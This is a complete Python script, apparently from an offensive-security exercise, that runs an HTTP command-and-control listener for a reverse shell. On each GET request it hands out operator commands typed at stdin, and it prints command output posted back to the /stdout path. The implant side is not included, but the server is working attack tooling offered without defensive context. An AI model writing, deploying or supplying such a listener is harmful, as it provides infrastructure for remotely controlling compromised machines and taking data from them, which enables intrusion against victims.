#Server

import http.server   # Built-in HTTP library
import os
import sys

HOST_NAME = '0.0.0.0'   # Host IP address
PORT_NUMBER = 80   # Listening port number 

class MyHandler(http.server.BaseHTTPRequestHandler): 

    def do_GET(s):
        
        command = os.read(sys.stdin.fileno(), 1024)
        
        s.send_response(200)             #HTML status 200 (OK)
        s.send_header("Content-type", "text/html")
        s.end_headers()
        s.wfile.write(command)           #send the command which we got from the user input
              
    def do_POST(s):
        
        status = 500    
        length = int(s.headers['Content-Length'])   #Define the length which means how many bytes the HTTP POST    	
        if s.path == "/stdout" and length > 0:
            status = 200
            postVar = s.rfile.read(length)               # Read then print the posted data
            sys.stdout.buffer.write(postVar)
            sys.stdout.flush()
        s.send_response(status)
        s.end_headers()
            
    def log_message(self, format, *args):
        return

if __name__ == '__main__':

    server_class = http.server.ThreadingHTTPServer
    httpd = server_class((HOST_NAME, PORT_NUMBER), MyHandler)
    
    try:
        httpd.serve_forever()   #if we got ctrl+c we will Interrupt and stop the server
    except KeyboardInterrupt:   
        print('[!] Server is terminated')
        httpd.server_close()

